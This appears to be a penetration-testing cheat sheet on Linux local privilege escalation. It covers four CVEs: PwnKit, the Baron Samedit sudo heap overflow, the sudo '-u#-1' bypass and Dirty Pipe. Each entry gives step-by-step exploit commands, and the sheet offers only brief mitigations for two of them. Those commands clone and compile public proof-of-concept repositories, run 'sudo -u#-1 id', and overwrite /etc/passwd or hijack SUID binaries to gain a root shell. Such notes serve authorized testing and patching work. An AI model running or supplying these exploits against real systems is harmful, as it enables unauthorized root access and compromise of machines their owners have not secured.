# Recent CVEs

## **PWNKit - CVE-2021-4034**

* **Reference:** [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034)
* **Affected Versions:** All Polkit versions from 2009 onwards are vulnerable
* **Exploit PoC:**
  1. `git clone https://github.com/arthepsy/CVE-2021-4034.git`
  2. `gcc cve-2021-4034-poc.c -o pwnkit`
  3. `./pwnkit`
* **Mitigation:**
  1. Patch polkit
  2. If no patches are available for your system, remove the SUID bit from the pkexec binary

***

## **Weak Sudo Versions - CVE-2021-3156**

* **Reference:** [https://nvd.nist.gov/vuln/detail/cve-2021-3156](https://nvd.nist.gov/vuln/detail/cve-2021-3156)
* **Affected Versions:** `1.8.31 - Ubuntu 20.04` `1.8.27 - Debian 10` `1.9.2 - Fedora 33` and others
* **Exploit PoC:**
  1. `git clone https://github.com/blasty/CVE-2021-3156`
  2. `cd git-folder`
  3. `make`
  4. Check target OS version: `cat /etc/lsb-release`
  5. Check available exploit targets: `./sudo-hax-me-a-sandwich`
  6. Exploit the target OS: `./sudo-hax-me-a-sandwich target-number`

***

## **Weak Sudo Version (prior to 1.8.28) - CVE-2019-14287**

* **Reference:** [https://www.sudo.ws/security/advisories/minus\_1\_uid/](https://www.sudo.ws/security/advisories/minus\_1\_uid/)
* **Affected Versions:** `sudo` versions prior to `1.8.28`
* **Exploit Prerequisites:**
  1. The current user needs to be part of the `sudoers` group
  2. The current user needs to be able to run any command as `(ALL)`
* **Exploit PoC:**
  1. Check sudo permissions: `sudo -l`
  2. Suppose the output of the previous command is `ALL=(ALL) /usr/bin/id`
  3. Run the command `id` as root: `sudo -u#-1 id`

***

## **Dirty Pipe - CVE-2022-0847**

* **Reference:** [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847)
* **Affected Versions:** All kernels from version 5.8 to 5.17
* **Exploit Prerequisites:** This vulnerability allows a user to write to arbitrary files as long as he has read access to these files
* **Exploit PoC:**
  1. Check kernel version: `uname -r`
  2. `git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git`
  3. `cd git-folder`
  4. `bash compile.sh`
  5. \[Option1] Modify the `/etc/passwd` file and get a shell: `./exploit-1`
  6. \[Option2] Identify a SUID binary using `find / -perm -4000` and run `./exploit-2` to leverage that binary file
